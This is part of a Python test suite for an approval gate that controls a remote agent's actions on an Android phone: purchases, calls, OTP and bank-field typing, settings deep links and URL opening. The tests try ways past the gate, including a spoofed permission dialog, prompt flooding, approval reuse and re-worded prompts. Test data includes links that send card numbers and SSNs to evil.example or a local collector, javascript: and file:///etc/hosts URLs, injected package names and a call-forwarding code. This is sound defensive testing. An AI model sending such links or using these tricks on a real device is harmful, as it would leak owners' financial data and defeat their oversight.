          code in ("gate_screen_unstable", "gate_denied", "gate_denied_page", "gate_needs_approval", "missing"),
          f"tap={code} {short(reply)[:200]}")
    dev.sh("input keyevent BACK")
    dev.home()


async def g_spoof(phone: Phone, dev: Device) -> None:
    """Security review C, H1: the stand-in draws "Allow Example Login to send you notifications?" on its own screen,
    then asks for contacts. Allow must not go through as a notifications grant: it asks (the owner denies), and
    contacts stay ungranted."""
    G = "spoof"
    dev.unlock()
    dev.sh("pm revoke com.example.login android.permission.READ_CONTACTS")
    dev.sh("pm clear-permission-flags com.example.login android.permission.READ_CONTACTS user-set user-fixed")
    dev.sh("am force-stop com.example.login")
    dev.sh("am start -n com.example.login/.SpoofActivity")
    await asyncio.sleep(2)
    b = await dev.wait_find("Use contacts")
    await phone.call("tap", x=b[0], y=b[1])  # the agent works in this app: it becomes the session app
    await asyncio.sleep(2.5)
    dev.shot("spoof-contacts-dialog")
    seen = [n["text"] for n in await dev.nodes() if n["text"]]
    code, reply, prompt = await perm_tap(phone, dev, "Allow", "spoof-allow")
    await asyncio.sleep(1)
    granted = dev.sh("dumpsys package com.example.login | grep 'READ_CONTACTS: granted=true'").strip()
    check(G, "Allow under an app-drawn notifications title asks (the owner denies) and contacts aren't granted",
          code == "gate_needs_approval" and prompt is not None and not granted,
          f"rule={rule(reply)} question={reply.get('gate', {}).get('question')!r} agent reads={seen[:6]} granted={granted!r}")
    dev.sh("input keyevent BACK")
    dev.home()


async def ua_tap(phone: Phone, dev: Device, match, name: str) -> tuple[str, dict, dict | None]:
    """The agent taps a node uiautomator finds (OpenMob's service restored first); a prompt that comes is denied."""
    target = next((n for n in dev.ua_nodes(name) if match(n)), None)
    await dev.restore_service()
    if not target:
        return "missing", {}, None
    r = await phone.call("tap", x=target["center"][0], y=target["center"][1])
    prompt = None
    if asks(r):
        prompt = await dev.deny(name + "-deny")
        await phone.gate_state(r["approval_id"])
    return r.get("code") or "ok", r, prompt


def is_call_button(n: dict) -> bool:
    rid, desc = n.get("resource-id", ""), n.get("content-desc", "").lower()
    return ("dialer" in n.get("package", "") and (any(k in rid for k in ("dialpad_floating_action_button",
                                                                           "dialpad_voice_call_button", "call_button"))
                                                  or desc in ("dial", "call")))


async def g_calls(phone: Phone, dev: Device) -> None:
    """Security review C, H2: a tel: link opens the dialer (allowed, no call); the dialer's Call button asks; a number
    with * or # (call forwarding **21*…#) asks with the screen lock. The owner denies; no call is placed."""
    G = "calls"
    dev.unlock()
    dev.home()
    r = await phone.call("open_url", url="tel:5551234567")
    await asyncio.sleep(3)
    f = dev.focus()
    check(G, "tel: opens the dialer without asking", r.get("ok") is True and ("dialer" in f or "phone" in f), short(r) + f" focus={f}")
    code, reply, prompt = await ua_tap(phone, dev, is_call_button, "calls-dial")
    calls = dev.sh("dumpsys telephony.registry | grep -m1 mCallState").strip()
    check(G, "tapping Call in the dialer asks (kind call) and no call is placed",
          code == "gate_needs_approval" and reply.get("gate", {}).get("kind") == "call" and prompt is not None
          and "mCallState=0" in calls, f"{code} rule={rule(reply)} question={reply.get('gate', {}).get('question')!r} {calls}")
    dev.sh("input keyevent BACK")
    dev.home()
    # Owner, 2026-10-10: one prompt, at the dialing. The link only opens the dialer; Call then asks with the screen lock.
    r = await phone.call("open_url", url="tel:**21*5551234%23")
    await asyncio.sleep(3)
    f = dev.focus()
    check(G, "a tel: link with a forwarding code opens the dialer without asking",
          r.get("ok") is True and ("dialer" in f or "phone" in f), short(r)[:160] + f" focus={f}")
    code, reply, prompt = await ua_tap(phone, dev, is_call_button, "calls-mmi-dial")
    calls = dev.sh("dumpsys telephony.registry | grep -m1 mCallState").strip()
    check(G, "dialing the forwarding code asks with the screen lock (kind call_code); no call placed",
          code == "gate_needs_approval" and reply.get("gate", {}).get("kind") == "call_code" and prompt is not None
          and "mCallState=0" in calls, f"{code} rule={rule(reply)} question={reply.get('gate', {}).get('question')!r} {calls}")
    dev.sh("input keyevent BACK")
    dev.home()


async def g_hittest(phone: Phone, dev: Device) -> None:
    """The gate's hit test (2026-10-10): the shop stand-in's Buy now sits in an earlier sibling than a full-screen
    layer and is drawn above it by elevation. The tap must still be judged as Buy now (it asks; the owner denies; no
    checkout), while a tap on the product title stays unasked."""
    G = "hittest"
    if not dev.installed("com.example.shop"):
        check(G, "stand-in shop installed", False, "skipped")
        return
    await shop_open(dev, ".LayeredActivity")
    dev.logcat_clear()
    buy = await dev.find("Buy now")
    title = await dev.find("Wireless earbuds", contains=True)
    if not buy or not title:
        check(G, "the layered page is readable", False, f"buy={buy} title={title}")
        return
    r = await phone.call("tap", x=title[0], y=title[1])
    check(G, "a tap on the product title over the layer doesn't ask", r.get("ok") is True, short(r))
    r = await phone.call("tap", x=buy[0], y=buy[1])
    prompt = None
    if asks(r):
        prompt = await dev.deny("hittest-buy-deny")
        await phone.gate_state(r["approval_id"])
    await asyncio.sleep(1)
    bought = "BUY NOW layered" in dev.log("ShopStandIn")
    check(G, "Buy now under a later full-screen layer asks (kind pay) and nothing is bought",
          asks(r) and r.get("gate", {}).get("kind") == "pay" and prompt is not None and not bought,
          f"{short(r)[:200]} prompt={prompt is not None} bought={bought}")
    dev.home()


async def clear_prompt(dev: Device, name: str) -> None:
    """The owner denies a prompt left open by the previous step (so the next one starts clean)."""
    if "ApprovalActivity" in dev.focus():
        await dev.deny(name)


async def shop_open(dev: Device, activity: str = ".ProductActivity") -> None:
    await clear_prompt(dev, "leftover" + activity.replace(".", "-"))
    dev.unlock()
    dev.sh("am force-stop com.example.shop")
    dev.sh(f"am start -n com.example.shop/{activity}")
    time.sleep(2.5)


async def g_shop(phone: Phone, dev: Device) -> None:
    G = "shop"
    if not dev.installed("com.example.shop"):
        check(G, "stand-in shop installed", False, "skipped")
        return
    await shop_open(dev)
    dev.logcat_clear()
    buy, plus = await dev.find("Buy now"), await dev.find("+")
    # mode: never without a signature is just a claim: the ceiling (auto) applies.
    r = await phone.call("tap", x=buy[0], y=buy[1], mode="never")
    prompt = await dev.prompt()
    check(G, "claiming mode 'never' still asks for Buy now", asks(r) and prompt is not None,
          short(r) + f" prompt={prompt}")
    again = await phone.call("tap", x=buy[0], y=buy[1])
    # gate_prompt_open, or the prompt's own window covering the target (builtin:own_window): refused either way.
    check(G, "a second call while the prompt is open is refused", refused(again, "gate_prompt_open") or
          (refused(again, "gate_denied_page") and again.get("gate", {}).get("rule") == "builtin:own_window"), short(again))
    # The legacy approval path can't re-word (or answer) a gate prompt: the owner reads the phone's own words.
    await phone.ws.send(json.dumps({"type": "approval_request", "id": r.get("approval_id"), "kind": "mode_change",
                                    "question": "Server wording", "action": {}, "digest": ""}))
    await asyncio.sleep(1.5)
    shown = [n.get("text") for n in dev.ua_nodes("shop-legacy-prompt") if n.get("package") == OWN and n.get("text")]
    check(G, "the legacy path can't re-word or answer a gate prompt",
          any("Buy now" in t for t in shown) and not any("Server wording" in t for t in shown), str(shown[:3]))
    await dev.deny("shop-never-claim")  # (uiautomator renumbered the windows: this prompt's permit couldn't be used)
    check(G, "the owner's Deny reaches the gate", await phone.gate_state(r["approval_id"]) == "denied", "")
    await dev.restore_service()
    await shop_open(dev)
    dev.logcat_clear()
    buy, plus = await dev.find("Buy now"), await dev.find("+")
    # B4: approve, then any other action (quantity +) voids the approval.
    r = await phone.call("tap", x=buy[0], y=buy[1])
    await dev.approve("shop-buy-now")
    state = await phone.gate_state(r["approval_id"])
    check(G, "the owner's approval (screen-lock PIN) reaches the gate", asks(r) and state == "approved", state)
    p = await phone.call("tap", x=plus[0], y=plus[1])
    voided = await phone.call("tap", x=buy[0], y=buy[1])
    await asyncio.sleep(1)
    log = dev.log("ShopStandIn")
    check(G, "an approval dies at any other action: quantity + then Buy now asks again (B4)",
          p.get("ok") is True and asks(voided) and "BUY NOW" not in log,
          f"plus={short(p)[:60]} resend={short(voided)[:160]} buys={log.count('BUY NOW')}")
    if asks(voided):
        await dev.approve("shop-buy-now-2")
        state2 = await phone.gate_state(voided["approval_id"])
        r = await phone.call("tap", x=buy[0], y=buy[1])
        await asyncio.sleep(2)
        check(G, "approved, the identical re-sent call runs once (honest path)",
              r.get("ok") is True and dev.log("ShopStandIn").count("BUY NOW qty=2") == 1, f"approval={state2} resend={short(r)}")
    # B5: Buy now (approved) → Edit cart → Proceed to checkout → Place your order asks again: the follow-up that
    # would have covered Place your order ends at a cart word.
    edit = await dev.wait_find("Edit cart")
    dev.logcat_clear()
    if edit:
        r = await phone.call("tap", x=edit[0], y=edit[1])
        await asyncio.sleep(1.5)
        go = await dev.wait_find("Proceed to checkout")
        r2 = await phone.call("tap", x=go[0], y=go[1])
        await asyncio.sleep(1.5)
        place = await dev.wait_find("Place your order")
        r3 = await phone.call("tap", x=place[0], y=place[1])
        prompt = await dev.prompt()
        await asyncio.sleep(0.5)
        check(G, "Buy now → cart → Place your order asks again (B5)",
              r.get("ok") is True and r2.get("ok") is True and asks(r3) and "ORDER PLACED" not in dev.log("ShopStandIn"),
              f"edit={short(r)[:50]} proceed={short(r2)[:50]} place={short(r3)[:200]}")
        if prompt:
            await dev.deny("shop-b5-place-order")
            await phone.gate_state(r3["approval_id"])
    else:
        check(G, "B5 chain reachable (checkout after an approved Buy now)", False, dev.focus())
    # Gesture variants on Buy now: a zero-length swipe and a 50 ms long press are taps.
    await shop_open(dev)
    dev.logcat_clear()
    buy = await dev.find("Buy now")
    r = await phone.call("swipe", x1=buy[0], y1=buy[1], x2=buy[0], y2=buy[1], duration_ms=40)
    check(G, "a zero-length swipe on Buy now asks", asks(r), short(r))
    if await dev.prompt(4):
        await dev.approve("shop-swipe-buy")  # approved but never re-sent: approving costs nothing, denials suspend
        await phone.gate_state(r["approval_id"])
    await asyncio.sleep(1)
    r = await phone.call("long_press", x=buy[0], y=buy[1], duration_ms=50)
    check(G, "a 50 ms long press on Buy now asks", asks(r), short(r))
    if await dev.prompt(4):
        await dev.approve("shop-longpress-buy")
        await phone.gate_state(r["approval_id"])
    check(G, "nothing was bought by the variants", "BUY NOW" not in dev.log("ShopStandIn"), "")
    dev.home()


async def g_webview(phone: Phone, dev: Device) -> None:
    G = "webview"
    await shop_open(dev, ".DeepCheckoutActivity")
    dev.logcat_clear()
    time.sleep(2)
    dev.shot("deep-webview")
    await dev.save_dump("deep-webview")
    # ui_elements may not reach into the WebView at all: a server works from the screenshot, so do we (the stand-in's
    # layout at 1080x2400: the OTP field, then "Place order", 120 elements deep).
    otp = await dev.find("Verification code", attr="hint") or await dev.find("Verification code") or (490, 763)
    gate = lambda r: f"{r.get('code') or 'ok'} {r.get('gate', {}).get('rule', '')} {r.get('gate', {}).get('question', '')}"
    # Focusing the field: on a page this deep the tap itself may ask (an unreadable branch asks); the owner allows it.
    first, _, t = await approved_resend(phone, dev, "deep-otp-focus", "tap", x=otp[0], y=otp[1])
    await asyncio.sleep(1.2)
    r = await phone.call("type_text", text="123456")
    prompt = await dev.prompt(5)
    check(G, "typing into a deep WebView OTP field asks (or is refused unread)",
          asks(r) or refused(r, "gate_screen_unstable", "gate_denied"),
          f"focus tap: {gate(first)} -> resent {gate(t)}; type: {gate(r)}")
    if prompt:
        await dev.deny("deep-otp")
        await phone.gate_state(r["approval_id"])
    await asyncio.sleep(1)
    place = await dev.find("Place order") or await dev.find("Place order", attr="content-desc") or (540, 1083)
    dev.logcat_clear()
    r = await phone.call("tap", x=place[0], y=place[1])
    prompt = await dev.prompt()
    await asyncio.sleep(0.5)
    check(G, "a deep WebView 'Place order' asks (B2)", asks(r) and prompt is not None and "ORDER PLACED" not in dev.log("ShopStandIn"),
          gate(r))
    if prompt:
        await dev.approve("deep-place-order")  # approved, never re-sent
        await phone.gate_state(r["approval_id"])
    dev.home()


async def g_flood(phone: Phone, dev: Device) -> None:
    G = "flood"
    await shop_open(dev)
    buy = await dev.find("Buy now")
    replies = await asyncio.gather(*[phone.call("tap", x=buy[0], y=buy[1]) for _ in range(20)])
    codes = [r.get("code") for r in replies]
    # The same action asked again reuses the open prompt (one approval id for every ask); every other reply is a
    # refusal: gate_prompt_open, the rate limit, or the prompt's own window covering the target.
    ids = {r.get("approval_id") for r in replies if asks(r)}
    others = [r for r in replies if not asks(r)]
    check(G, "20 parallel risky calls make exactly one prompt", len(ids) == 1 and all(
        refused(r, "gate_prompt_open", "gate_rate_limited") or (refused(r, "gate_denied_page") and
        r.get("gate", {}).get("rule") == "builtin:own_window") for r in others),
        f"approval ids={len(ids)} " + str({c: codes.count(c) for c in set(codes)}))
    prompts, denials, last = 1, 0, None
    for r in replies:
        if asks(r):
            last = r
    for i in range(8):
        if not last or not asks(last):
            break
        await dev.deny(f"flood-{i}")
        await phone.gate_state(last["approval_id"])
        denials += 1
        last = await phone.call("tap", x=buy[0], y=buy[1])
        if asks(last):
            prompts += 1
    check(G, "repeated asks stop: 3 denials suspend (or the prompt limit refuses)",
          refused(last, "gate_rate_limited") and prompts <= 6, f"prompts={prompts} denials={denials} last={short(last)}")
    r = await phone.call("tap", x=540, y=400)
    check(G, "while suspended even harmless acts are refused", refused(r, "gate_rate_limited"), short(r))
    dev.shot("flood-after")
    dev.home()


async def g_promptrate(phone: Phone, dev: Device) -> None:
    """Prompt flooding with an owner who approves (and a server that never uses the approvals): at most 6 asks in
    10 minutes, then refusals with no prompt."""
    G = "flood"
    await shop_open(dev)
    buy = await dev.find("Buy now")
    asked, last = 0, {}
    for i in range(8):
        last = await phone.call("tap", x=buy[0], y=buy[1])
        if not asks(last):
            break
        asked += 1
        await dev.approve(f"promptrate-{i}")
        await phone.gate_state(last["approval_id"])
        await phone.call("swipe", x1=540, y1=1800, x2=540, y2=1700, duration_ms=300)  # voids the permit
    shown = await dev.prompt(3)
    check(G, "at most 6 prompts in 10 minutes, then refused without a prompt",
          asked == 6 and refused(last, "gate_rate_limited") and shown is None, f"asked={asked} then {short(last)[:200]}")
    dev.home()


async def g_keepawake(phone: Phone, dev: Device) -> None:
    G = "keepawake"
    dev.unlock()
    dev.home()
    stay = dev.sh("settings get global stay_on_while_plugged_in").strip()
    dev.sh("settings put global stay_on_while_plugged_in 0")  # the emulator is "plugged in": stay-awake would win
    dev.sh("settings put system screen_off_timeout 15000")
    # One admitted act (it may hold the screen on for 20 s), then nothing but reads, as fast as the server likes.
    act = await phone.call("swipe", x1=540, y1=1500, x2=540, y2=1000, duration_ms=300)
    t0 = time.time()
    off_at, reads = None, 0
    while time.time() - t0 < 70:
        await phone.call("screenshot")
        await phone.call("ui_elements")
        await phone.call("device_state")
        reads += 3
        if not dev.awake():
            off_at = time.time() - t0
            break
        await asyncio.sleep(0.5)
    check(G, "server reads alone don't keep the screen on (B3)", off_at is not None and off_at < 45,
          f"act={act.get('ok')}; screen off {off_at and round(off_at, 1)} s after the last act, through {reads} reads "
          f"(timeout 15 s, act hold 20 s)")
    for _ in range(30):  # Android locks a few seconds after the screen goes off ("lock after timeout")
        if "mIsShowing=true" in dev.sh("dumpsys window | grep -A1 KeyguardStateMonitor"):
            break
        await asyncio.sleep(0.5)
    r = await phone.call("tap", x=540, y=1200)
    check(G, "acts while the phone is locked are refused", refused(r, "phone_locked"), short(r))
    dev.sh("settings put system screen_off_timeout 1800000")
    dev.sh(f"settings put global stay_on_while_plugged_in {stay or 0}")
    dev.unlock()


async def g_friction(phone: Phone, dev: Device) -> None:
    G = "friction"
    await shop_open(dev)
    dev.logcat_clear()
    start = phone.pending_count()
    steps = []
    for label in ("Add to cart", "Cart", "Proceed to checkout"):
        p = await dev.wait_find(label)
        steps.append((label, await phone.call("tap", x=p[0], y=p[1])))
        time.sleep(1.5)
    p = await dev.wait_find("Place your order")
    first, prompt, final = await approved_resend(phone, dev, "friction-place-order", "tap", x=p[0], y=p[1])
    time.sleep(1)
    n = phone.pending_count() - start
    check(G, "add to cart → checkout → Place your order: exactly one prompt",
          all(r.get("ok") for _, r in steps) and n == 1 and final.get("ok") is True and "ORDER PLACED" in dev.log("ShopStandIn"),
          f"prompts={n} steps={[(l, r.get('ok')) for l, r in steps]} final={short(final)[:80]}")
    await shop_open(dev)
    dev.logcat_clear()
    start = phone.pending_count()
    b = await dev.find("Buy now")
    _, _, r = await approved_resend(phone, dev, "friction-buy-now", "tap", x=b[0], y=b[1])
    time.sleep(2)
    p = await dev.wait_find("Place your order")
    r2 = await phone.call("tap", x=p[0], y=p[1])
    time.sleep(1)
    n = phone.pending_count() - start
    check(G, "Buy now → Place your order: one prompt for the whole checkout (D4)",
          r.get("ok") is True and r2.get("ok") is True and n == 1 and "ORDER PLACED" in dev.log("ShopStandIn"),
          f"prompts={n} buy={short(r)[:60]} place={short(r2)[:80]}")
    dev.home()


async def g_probe(phone: Phone, dev: Device) -> None:
    """Debugging aid: print what the phone reads (focus, ui_elements) every 3 s for a minute."""
    for xy in filter(None, os.environ.get("PROBE_TAPS", "").split(";")):  # e.g. "540,2186;540,1392"
        x, y = (int(v) for v in xy.split(","))
        print("TAP", x, y, short(await phone.call("tap", x=x, y=y)), flush=True)
        await asyncio.sleep(2)
    for _ in range(int(os.environ.get("PROBE_ROUNDS", "20"))):
        print("FOCUS", dev.focus(), flush=True)
        for n in await dev.nodes():
            if n["text"] or n["content-desc"] or n["hint"]:
                print("  ", repr(n["text"])[:60], repr(n["content-desc"])[:40], n["hint"][:30], n["resource-id"], n["class"],
                      n["box"], flush=True)
        await asyncio.sleep(3)


# ------------------------------------------------------------------- phase 5: what the phone learned after B7

def rule(reply: dict) -> str:
    return f"{reply.get('code') or ('ok' if reply.get('ok') else 'error')}:{reply.get('gate', {}).get('rule', '')}"


async def g_deeplinks(phone: Phone, dev: Device) -> None:
    """`open_settings` (docs/design/deep-links.md): only the phone's own page keys open; security pages have no key;
    an app page for a blocked app or OpenMob is refused; a malformed package opens nothing; date_time asks."""
    G = "deeplinks"
    dev.unlock()
    dev.home()
    dev.sh("am force-stop com.android.settings")
    r = await phone.call("open_settings", page="display")
    await asyncio.sleep(2)
    f = dev.focus()
    dev.shot("deeplink-display")
    check(G, "open_settings display (everyday, control) opens Settings", r.get("ok") is True and "com.android.settings" in f,
          short(r) + f" focus={f}")
    dev.home()
    dev.sh("am force-stop com.android.settings")
    # No key reaches a security-critical page: the phone's table has none, and anything else is unknown.
    for key in ("accessibility", "security", "developer_options", "language", "default_apps", "vpn", "",
                "android.settings.ACCESSIBILITY_SETTINGS", "../display", "display ", "DISPLAY"):
        r = await phone.call("open_settings", page=key)
        check(G, f"open_settings {key!r}: refused as an unknown page", refused(r, "gate_denied_page") and
              r.get("gate", {}).get("rule") == "builtin:settings_unknown_page", rule(r))
    await asyncio.sleep(1)
    f = dev.focus()
    check(G, "nothing opened for the unknown keys", "com.android.settings" not in f, f"focus={f}")
    for page in ("app_details", "app_notifications"):
        r = await phone.call("open_settings", page=page, package="com.example.bank")
        check(G, f"{page} for the bank app is refused", refused(r, "gate_blocked_app") and
              r.get("gate", {}).get("rule") == "builtin:sensitive_apps", rule(r))
        r = await phone.call("open_settings", page=page, package=OWN)
        check(G, f"{page} for OpenMob itself is refused", refused(r, "gate_blocked_app") and
              r.get("gate", {}).get("rule") == "builtin:own_app", rule(r))
    r = await phone.call("open_settings", page="app_details")
    check(G, "app_details without a package is refused", refused(r, "gate_denied_page"), rule(r))
    for bad in ("com.example.bank;end", "package:com.example.bank", "com.example.shop;end", "../../com.example.shop",
                "Com Example Shop", "x", "com.example.shop\n", ["com.example.shop"]):
        r = await phone.call("open_settings", page="app_details", package=bad)
        await asyncio.sleep(0.5)
        f = dev.focus()
        check(G, f"app_details with a malformed package {str(bad)[:28]!r}: refused, nothing opened",
              r.get("ok") is False and "com.android.settings" not in f, rule(r) + f" {short(r)[:120]} focus={f}")
    r = await phone.call("open_settings", page="app_details", package="com.example.nothere")
    check(G, "app_details for an app that isn't installed is an error, nothing opened", r.get("ok") is False, short(r))
    r = await phone.call("open_settings", page="app_details", package="com.example.shop")
    await asyncio.sleep(2)
    f = dev.focus()
    dev.shot("deeplink-shop-app-info")
    check(G, "app_details for an ordinary app (control) opens App info", r.get("ok") is True and "com.android.settings" in f,
          short(r) + f" focus={f}")
    dev.home()
    dev.sh("am force-stop com.android.settings")
    # Manual date and time asks (kind settings, the screen lock); approved, the identical call opens the page.
    first, p, final = await approved_resend(phone, dev, "deeplink-date-time", "open_settings", page="date_time")
    await asyncio.sleep(2)
    f = dev.focus()
    dev.shot("deeplink-date-time")
    check(G, "open_settings date_time asks on the phone (kind settings)", asks(first) and
          first.get("gate", {}).get("kind") == "settings" and p is not None, short(first) + f" prompt={p and p['texts']}")
    check(G, "approved with the screen lock, the re-sent call opens Date & time", final.get("ok") is True and
          "com.android.settings" in f, short(final) + f" focus={f}")
    dev.home()


async def g_typing(phone: Phone, dev: Device) -> None:
    """`type_text` with `replace: true`: refused like an insert in a password field and in a blocked app; an OTP
    field asks, and the permit for an approved insert can't be spent on a replace (the permit binds `replace`)."""
    G = "typing"
    if not (dev.installed("com.example.login") and dev.installed("com.example.bank")):
        check(G, "stand-in login and bank apps installed", False, "skipped")
        return
    dev.unlock()
    dev.sh("am force-stop com.example.login")
    dev.sh("am start -n com.example.login/.MainActivity")
    time.sleep(2)
    dev.logcat_clear()
    email = await dev.wait_find("Email", attr="hint") or await dev.wait_find("Email")
    await phone.call("tap", x=email[0], y=email[1])
    await asyncio.sleep(0.8)
    r1 = await phone.call("type_text", text="first@example.com")
    r2 = await phone.call("type_text", text="second@example.com", replace=True)
    await asyncio.sleep(0.5)
    texts = [n["text"] for n in await dev.nodes() if n["text"]]
    check(G, "replace: true into an ordinary field replaces its text (honest control)",
          r1.get("ok") is True and r2.get("ok") is True and "second@example.com" in texts and
          not any("first" in t for t in texts), f"{short(r1)[:60]} {short(r2)[:60]} texts={texts[:6]}")
    pw = await dev.find("Password", attr="hint") or await dev.find("Password")
    await phone.call("tap", x=pw[0], y=pw[1])
    await asyncio.sleep(0.8)
    r = await phone.call("type_text", text="hunter2", replace=True)
    await asyncio.sleep(0.5)
    log = dev.log("LoginStandIn")
    check(G, "replace: true into a password field is refused, the field untouched",
          refused(r, "gate_password_field") and "PASSWORD length" not in log, rule(r) + f" log={'PASSWORD' in log}")
    otp = await dev.find("Verification code", attr="hint") or await dev.find("Verification code")
    if not otp:
        check(G, "OTP field found", False, await dev.save_dump("typing-login"))
    else:
        await phone.call("tap", x=otp[0], y=otp[1])
        await asyncio.sleep(0.8)
        dev.logcat_clear()
        ins = await phone.call("type_text", text="123456")
        check(G, "typing a code into an OTP field asks (risk:otp_field)", asks(ins) and "otp_field" in ins.get("gate", {}).get("rule", ""),
              rule(ins) + " " + str(ins.get("gate", {}).get("question")))
        if asks(ins):
            await dev.approve("typing-otp-insert")
            state = await phone.gate_state(ins["approval_id"])
            rep = await phone.call("type_text", text="123456", replace=True)  # the approved call, with replace added
            await asyncio.sleep(0.5)
            log = dev.log("LoginStandIn")
            check(G, "an approved insert's permit can't be spent on a replace: the replace asks again, nothing typed",
                  state == "approved" and asks(rep) and rep.get("approval_id") != ins["approval_id"] and "OTP length" not in log,
                  f"insert approval={state}; replace: {rule(rep)} new id={rep.get('approval_id') != ins['approval_id']} typed={'OTP length' in log}")
            if asks(rep):
                await dev.approve("typing-otp-replace")
                state2 = await phone.gate_state(rep["approval_id"])
                again = await phone.call("type_text", text="123456", replace=True)
                await asyncio.sleep(0.8)
                log = dev.log("LoginStandIn")
                check(G, "approved for the replace, the identical replace runs once (honest path)",
                      state2 == "approved" and again.get("ok") is True and log.count("OTP length=6") == 1,
                      f"approval={state2} resend={short(again)[:80]} otp lines={[l.split(': ', 1)[-1] for l in log.splitlines() if 'OTP' in l]}")
                r = await phone.call("type_text", text="123456")
                check(G, "the earlier insert approval is spent: inserting asks again", asks(r), rule(r))
                if asks(r):
                    await dev.deny("typing-otp-insert-2")
                    await phone.gate_state(r["approval_id"])
    # A field in the bank app: the owner focuses it (their own tap); the server may neither insert nor replace.
    dev.sh("am force-stop com.example.bank")
    dev.sh("am start -n com.example.bank/.TransferActivity")
    time.sleep(2)
    field = next((n["center"] for n in dev.ua_nodes("typing-bank-transfer") if n.get("text") == "Amount"), None)
    await dev.restore_service()
    if not field:
        check(G, "bank Amount field found", False, dev.focus())
    else:
        dev.sh(f"input tap {field[0]} {field[1]}")
        await asyncio.sleep(1)
        dev.logcat_clear()
        outcomes = []
        for kw in ({"text": "100"}, {"text": "100", "replace": True}):
            r = await phone.call("type_text", **kw)
            outcomes.append(rule(r))
        r = await phone.call("key", name="ENTER")
        outcomes.append("ENTER " + rule(r))
        await asyncio.sleep(0.5)
        log = dev.log("BankStandIn")
        check(G, "insert, replace and ENTER in a field of the bank app are refused, the field untouched",
              all(o.split(" ")[-1].startswith(("gate_blocked_app", "gate_screen_unstable")) for o in outcomes) and "AMOUNT length" not in log,
              f"{outcomes} typed={'AMOUNT length' in log}")
    dev.home()


async def g_financial(phone: Phone, dev: Device) -> None:
    """Financial safeguards (abuse series 2026-10-10, F2 and F3): a card number or SSN typed into an ordinary field asks
    (kind sensitive_number, tap level) and nothing is typed on a no; an ordinary phone number doesn't ask; a link
    carrying a card number (plain, URL-encoded, dashed) is refused by rule and nothing opens."""
    G = "financial"
    if not dev.installed("com.example.login"):
        check(G, "stand-in login app installed", False, "skipped")
        return
    dev.unlock()
    dev.sh("am force-stop com.example.login")
    dev.sh("am start -n com.example.login/.MainActivity")
    time.sleep(2)
    email = await dev.wait_find("Email", attr="hint") or await dev.wait_find("Email")
    await phone.call("tap", x=email[0], y=email[1])
    await asyncio.sleep(0.8)
    for text, what in (("4111 1111 1111 1111", "a card number"), ("123-45-6789", "an SSN")):
        r = await phone.call("type_text", text=text)
        gate = r.get("gate", {})
        check(G, f"typing {what} into an ordinary field asks (sensitive_number, tap level)",
              asks(r) and gate.get("rule") == "risk:sensitive_number" and gate.get("kind") == "sensitive_number",
              rule(r) + " " + str(gate.get("question")))
        if asks(r):
            await dev.deny(f"financial-{what.split()[-1]}")
            await phone.gate_state(r["approval_id"])
        await asyncio.sleep(0.5)
        texts = [n["text"] for n in await dev.nodes() if n["text"]]
        check(G, f"denied: {what} isn't typed", not any(text in t for t in texts), f"texts={texts[:6]}")
        await asyncio.sleep(1.2)  # past the prompt cooldown
    r = await phone.call("type_text", text="415-555-2671")
    check(G, "an ordinary phone number is typed without asking (honest control)", r.get("ok") is True, short(r)[:100])
    dev.home()
    await asyncio.sleep(1)
    for url in ("http://10.0.2.2:8799/collect?card=4111111111111111&cvv=123",
                "http://10.0.2.2:8799/collect?card=4111%201111%201111%201111",
                "http://10.0.2.2:8799/collect?c=4111%25201111%25201111%25201111",
                "https://evil.example/p/4111-1111-1111-1111", "https://evil.example/apply?ssn=000-12-3456"):
        r = await phone.call("open_url", url=url)
        check(G, f"open_url carrying a card number or SSN is refused ({url[url.index('?') if '?' in url else 20:][:30]})",
              refused(r, "gate_denied") and r.get("gate", {}).get("rule") == "builtin:sensitive_link", rule(r))
    await asyncio.sleep(1)
    f = dev.focus()
    check(G, "nothing opened for the refused links", "launcher" in f.lower(), f"focus={f}")


async def g_links(phone: Phone, dev: Device) -> None:
    """`open_url` (docs/design/app-links.md): custom and dangerous schemes are refused; tel:, sms:, mailto:, market:
    open their handler and never a call or an install; an https link whose verified handler is the bank is refused,
    and `resolve_url` says so without opening it."""
    G = "links"
    dev.unlock()
    dev.home()
    for url in ("spotify:search:lofi", "upi://pay?pa=x@bank", "whatsapp://send?text=hi", "javascript:alert(1)",
                "file:///etc/hosts", "content://com.android.contacts/contacts", "data:text/html,hi",
                "android-app://com.example.bank", "examplebank://transfer", "intent://x#Intent;scheme=https;end", "ftp://x/"):
        r = await phone.call("open_url", url=url)
        check(G, f"open_url {url.split(':')[0]}: is refused by scheme", refused(r, "gate_denied") and
              r.get("gate", {}).get("rule") == "builtin:url_scheme", rule(r))
    f = dev.focus()
    check(G, "nothing opened for the refused schemes", "launcher" in f.lower() or "nexuslauncher" in f, f"focus={f}")
    dialer_focus, call_state = "", ""
    for url, handlers, what in (("tel:5551234567", ("dialer", "phone"), "the dialer"),
                                ("sms:5551234567?body=hello", ("messaging", "mms"), "a message draft"),
                                ("mailto:owner@example.com?subject=hi&body=x", ("android.gm", "mail", "email"), "an email draft"),
                                ("market://details?id=com.example.shop", ("vending",), "the store page"),
                                ("geo:0,0?q=coffee", ("maps", "chrome"), "a map")):
        dev.home()
        r = await phone.call("open_url", url=url)
        f = dev.focus()
        for _ in range(16):  # a cold Maps or Gmail on the emulator can take more than 3 s to reach the front
            await asyncio.sleep(0.5)
            f = dev.focus()
            if "launcher" not in f.lower():
                break
        await asyncio.sleep(1)
        f = dev.focus()
        scheme = url.split(":")[0]
        dev.shot("link-" + scheme)
        calls = dev.sh("dumpsys telephony.registry | grep -m1 mCallState").strip()
        if scheme == "tel":
            dialer_focus, call_state = f, calls
        opened = r.get("ok") is True and any(h in f for h in handlers)
        no_handler = r.get("ok") is False and r.get("code") is None  # this image lacks the app: a plain error, no gate code
        check(G, f"open_url {scheme}: opens {what} (or a plain error without a handler), never the installer",
              (opened or no_handler) and "packageinstaller" not in f and OWN not in f and "mCallState=0" in calls,
              short(r)[:120] + f" focus={f} {calls}")
        dev.sh("input keyevent BACK")
    check(G, "tel: opened the dialer without placing a call", any(h in dialer_focus for h in ("dialer", "phone")) and
          "mCallState=0" in call_state, f"focus={dialer_focus} {call_state}")
    dev.home()
    # The bank as the verified handler of its https link (what a real bank app is).
    dev.sh("pm set-app-links --package com.example.bank 2 bank.example.com")
    dev.sh("pm set-app-links-user-selection --user 0 --package com.example.bank true bank.example.com")
    try:
        res = await phone.call("resolve_url", url="https://bank.example.com/account")
        await asyncio.sleep(1)
        f = dev.focus()
        got = res.get("result") or {}
        check(G, "resolve_url names the bank as the handler of its https link without opening it",
